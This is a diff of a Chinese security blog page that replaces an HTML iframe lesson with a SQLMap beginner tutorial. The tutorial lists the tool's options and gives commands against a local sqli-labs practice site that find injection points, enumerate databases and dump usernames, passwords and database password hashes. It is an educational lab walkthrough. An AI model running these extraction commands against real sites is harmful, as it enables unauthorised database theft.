+<li>–hex 获取数据时调用 DBMS 的 hex 函数</li>
+<li>–output-dir=OUT.. 自定义输出目录路径</li>
+<li>–parse-errors 从响应中解析并显示 DBMS 错误信息</li>
+<li>–save=SAVECONFIG 将选项设置保存到一个 INI 配置文件</li>
+<li>–scope=SCOPE 用正则表达式从提供的代理日志中过滤目标</li>
+<li>–test-filter=TE.. 根据 payloads 和/或标题（例如：ROW）选择测试</li>
+<li>–test-skip=TEST.. 根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</li>
+<li>–update 更新 sqlmap</li>
+</ul>
+<p><strong>其他选项：</strong></p>
+<ul>
+<li>-z MNEMONICS 使用短助记符（例如：“flu,bat,ban,tec=EU”）</li>
+<li>–alert=ALERT 在找到 SQL 注入时运行 OS 命令</li>
+<li>–answers=ANSWERS 设置问题答案（例如：“quit=N,follow=N”）</li>
+<li>–beep 出现问题提醒或在发现 SQL 注入时发出提示音</li>
+<li>–cleanup 指定移除 DBMS 中的特定的 UDF 或者数据表</li>
+<li>–dependencies 检查 sqlmap 缺少什么（非核心）依赖</li>
+<li>–disable-coloring 关闭彩色控制台输出</li>
+<li>–gpage=GOOGLEPAGE 指定页码使用 Google dork 结果</li>
+<li>–identify-waf 针对 WAF/IPS/IDS 保护进行彻底的测试</li>
+<li>–mobile 使用 HTTP User-Agent 模仿智能手机</li>
+<li>–offline 在离线模式下工作（仅使用会话数据）</li>
+<li>–purge-output 安全地删除输出目录的所有内容</li>
+<li>–skip-waf 跳过启发式检测 WAF/IPS/IDS 保护</li>
+<li>–smart 只有在使用启发式检测时才进行彻底的测试</li>
+<li>–sqlmap-shell 调出交互式 sqlmap shell</li>
+<li>–tmp-dir=TMPDIR 指定用于存储临时文件的本地目录</li>
+<li>–web-root=WEBROOT 指定 Web 服务器根目录（例如：”/var/www”）</li>
+<li>–wizard 适合初级用户的向导界面</li>
+</ul>
+<h4 id="3-SQLMap-入门"><a href="#3-SQLMap-入门" class="headerlink" title="3. SQLMap 入门"></a>3. SQLMap 入门</h4><p>搭建 sql-labs 靶场，</p>
+<p>SQLiLabs源码下载：<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>使用phpstudy搭建: <a target="_blank" rel="noopener" href="https://www.xp.cn/">https://www.xp.cn/</a></p>
+<p>下载之后开启 apache 和 mysql ，将下载的源码解压到 WWW 目录下，然后访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/">http://127.0.0.1/sqli-labs-master/</a> 首页，点击 Setup/reset Database for labs 设置数据库信息即可完成靶场搭建。</p>
+<p><strong>判断是否存在注入</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1
 </code></pre>
-<h4 id="10-框架的使用"><a href="#10-框架的使用" class="headerlink" title="10.框架的使用"></a>10.框架的使用</h4><p><code>iframe</code>语法:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"URL"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
+<p><img src="https://s1.ax1x.com/2022/08/15/va5xDP.jpg" alt="判断注入"></p>
+<blockquote>
+<p>当注入点后面的参数大于等于两个时，需要加双引号，如：<code>python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=1&amp;uid=2"</code></p>
+</blockquote>
+<p>当开始检测后，会出现选项，第一处意思是：检测到的数据库可能是MYSql，是否需要跳过检测其他数据库；第二处意思：对于剩余的测试，是否想要包含“MySQL”扩展提供的level级别(1)和risk风险(1)值的所有测试；第三处意思：GET参数存在漏洞，是否继续测试其他参数。（这里可以使用 –batch 参数跳过询问用户输入，使用默认配置 ）</p>
+<p>如果检测的时候，没有出现这三个提示，是因为你之前测试过，存在缓存信息，可以使用 –flush-session 清除缓存信息。</p>
+<p><strong>判断文本中的请求是否存在注入</strong></p>
+<p>可以先进行抓取数据包，然后保存到 .txt 文件中，使用 -r 参数指定 HTTP 数据包文件</p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -r c:\1.txt
 </code></pre>
-<p>该<code>URL</code>指向不同的网页。</p>
-<p><code>ifram</code>e - 设置高度与宽度</p>
-<p><code>height</code> 和 <code>width</code> 属性用来定义<code>iframe</code>标签的高度与宽度。</p>
-<p>属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe loading<span class="token operator">=</span><span class="token string">"lazy"</span> src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> width<span class="token operator">=</span><span class="token string">"200"</span> height<span class="token operator">=</span><span class="token string">"200"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
+<blockquote>
+<p>-r 参数，一般存在 cookie 注入时使用。</p>
+</blockquote>
+<p><strong>查询当前用户下的所有数据库</strong></p>
+<p>在确定存在注入点之后，查询当前用户下的所有数据库信息。</p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --dbs
 </code></pre>
-<p><code>iframe</code> - 移除边框</p>
-<p><code>frameborder</code> 属性用于定义<code>iframe</code>表示是否显示边框。</p>
-<p>设置属性值为 “0” 移除<code>iframe</code>的边框:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> frameborder<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
+<p><img src="https://s1.ax1x.com/2022/08/15/vd9Q0S.jpg" alt="数据库信息"></p>
+<p><strong>获取数据库中的表名</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security --tables
 </code></pre>
-<p>使用 <code>iframe</code> 来显示目标链接页面<br><code>iframe</code> 可以显示一个目标链接的页面</p>
-<p>目标链接的属性必须使用 <code>iframe</code> 的属性，如下实例:</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> name<span class="token operator">=</span><span class="token string">"iframe_a"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span>
-<span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"https://www.runoob.com"</span> target<span class="token operator">=</span><span class="token string">"iframe_a"</span> rel<span class="token operator">=</span><span class="token string">"noopener"</span><span class="token operator">></span>RUNOOB.COM<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdCLG9.jpg" alt="表的信息"></p>
+<p><strong>获取表中的字段</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security -T <span class="token function">users</span> --columns
 </code></pre>
-<hr>
-<h3 id="0x004-更多详细教程"><a href="#0x004-更多详细教程" class="headerlink" title="0x004 更多详细教程"></a>0x004 更多详细教程</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/html/html-tutorial.html">HTML教程</a></p>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdPZsP.jpg" alt="字段信息"></p>
+<p><strong>获取字段内容</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 -D security -T <span class="token function">users</span> -C username,password --dump
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdPjYQ.jpg" alt="账号和密码"></p>
+<p><strong>获取数据库所有用户</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --users
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdimlR.jpg" alt="数据库用户信息"></p>
+<p><strong>获取数据库用户的密码</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --passwords
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdiUXt.jpg" alt="数据库用户密码"></p>
+<blockquote>
+<p>密码使用MySQL5加密</p>
+</blockquote>
+<p><strong>获取当前网站数据库的名称</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --current-db
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdibcR.jpg" alt="当前网站数据库名"></p>
+<p><strong>获取当前网站数据库的用户名称</strong></p>
+<pre class=" language-bash"><code class="language-bash">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id<span class="token operator">=</span>1 --current-user
+</code></pre>
+<p><img src="https://s1.ax1x.com/2022/08/15/vdFc5D.jpg" alt="当前网站数据库用户名"></p>
 
                 
             </div>
@@ -747,7 +906,7 @@ text/plain
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Cx330Lm.github.io/2022/08/08/toc-heading-2/">http://Cx330Lm.github.io/2022/08/08/toc-heading-2/</a>
+                    <a href="http://Cx330Lm.github.io/2022/08/15/toc-heading-8/">http://Cx330Lm.github.io/2022/08/15/toc-heading-8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -785,12 +944,16 @@ text/plain
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/HTML/">
-                                    <span class="chip bg-color">HTML</span>
-                                </a>
-                            
                                 <a href="/tags/Web-Security/">
                                     <span class="chip bg-color">Web Security</span>
+                                </a>
+                            
+                                <a href="/tags/tools/">
+                                    <span class="chip bg-color">tools</span>
+                                </a>
+                            
+                                <a href="/tags/SQLMap/">
+                                    <span class="chip bg-color">SQLMap</span>
                                 </a>
                             
                         </div>
@@ -1097,40 +1260,42 @@ text/plain
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/08/08/toc-heading-3/">
+                <a href="/2022/08/15/toc-heading-8/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtucbq.jpg" class="responsive-img" alt="WEB安全MySQL基础">
+                        <img src="https://s1.ax1x.com/2022/08/15/vdkhYF.png" class="responsive-img" alt="SQLMap入门">
                         
-                        <span class="card-title">WEB安全MySQL基础</span>
+                        <span class="card-title">SQLMap入门</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。
+                            SQLMap 是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置很多绕过插件。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/MySQL/" class="post-category">
-                                    MySQL
+                            <a href="/categories/SQLMap/" class="post-category">
+                                    SQLMap
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1138,8 +1303,12 @@ text/plain
                         <span class="chip bg-color">Web Security</span>
                     </a>
                     
-                    <a href="/tags/MySQL/">
-                        <span class="chip bg-color">MySQL</span>
+                    <a href="/tags/tools/">
+                        <span class="chip bg-color">tools</span>
+                    </a>
+                    
+                    <a href="/tags/SQLMap/">
+                        <span class="chip bg-color">SQLMap</span>
                     </a>
                     
                 </div>
@@ -1153,30 +1322,30 @@ text/plain
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/08/toc-heading-1/">
+                <a href="/2022/08/12/toc-heading-7/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtKnMj.png" class="responsive-img" alt="hexo+github博客搭建">
+                        <img src="https://s1.ax1x.com/2022/08/13/vtuW5T.jpg" class="responsive-img" alt="WEB安全Nmap基础">
                         
-                        <span class="card-title">hexo+github博客搭建</span>
+                        <span class="card-title">WEB安全Nmap基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在经历前前后后多次失败之后，终于搭建出了属于自己的博客，目前博客的大致功能已经齐全；本博客基于Hexo框架，采用hexo-theme-matery主题，在这里非常感谢作者洪卫的hexo-blog-fly博客开源，极大简化了构建博客的工作量和复杂度。在此开源博客的基础上做了改进，修复了一些bug，顺利搭建完成了我的个人博客。大家对此主题有兴趣的可以下载源代码，搭建属于自己的个性化博客。
+                            Nmap是一款开源免费的网络发现（`Network Discovery`）和安全审计（`Security Auditing`）工具。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-12
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/MyBlog/" class="post-category">
-                                    MyBlog
+                            <a href="/categories/nmap/" class="post-category">
+                                    nmap
                                 </a>
                             
                             
@@ -1186,16 +1355,16 @@ text/plain
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/hexo/">
-                        <span class="chip bg-color">hexo</span>
+                    <a href="/tags/Web-Security/">
+                        <span class="chip bg-color">Web Security</span>
                     </a>
                     
-                    <a href="/tags/github/">
-                        <span class="chip bg-color">github</span>
+                    <a href="/tags/nmap/">
+                        <span class="chip bg-color">nmap</span>
                     </a>
                     
-                    <a href="/tags/MyBlog/">
-                        <span class="chip bg-color">MyBlog</span>
+                    <a href="/tags/tools/">
+                        <span class="chip bg-color">tools</span>
                     </a>
                     
                 </div>
